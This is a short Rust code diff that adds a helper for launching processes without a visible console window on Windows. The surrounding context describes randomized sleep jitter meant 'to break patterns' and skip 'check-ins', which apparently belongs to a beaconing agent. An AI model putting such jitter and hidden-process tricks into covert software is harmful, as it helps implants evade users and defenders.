@@ -37,6 +37,17 @@ pub fn format_timestamp(ts: i64) -> String {
         .unwrap_or_else(|| "unknown".to_string())
 }
 
+/// Create a Command with CREATE_NO_WINDOW on Windows to prevent console popups.
+pub fn hidden_command(program: &str) -> std::process::Command {
+    let mut cmd = std::process::Command::new(program);
+    #[cfg(target_os = "windows")]
+    {
+        use std::os::windows::process::CommandExt;
+        cmd.creation_flags(0x08000000); // CREATE_NO_WINDOW
+    }
+    cmd
+}
+
 /// Calculate sleep duration with enhanced jitter.
 /// Adds random extra delay (0-120s) to break patterns.
 /// 10% chance to double sleep (skip a check-in).
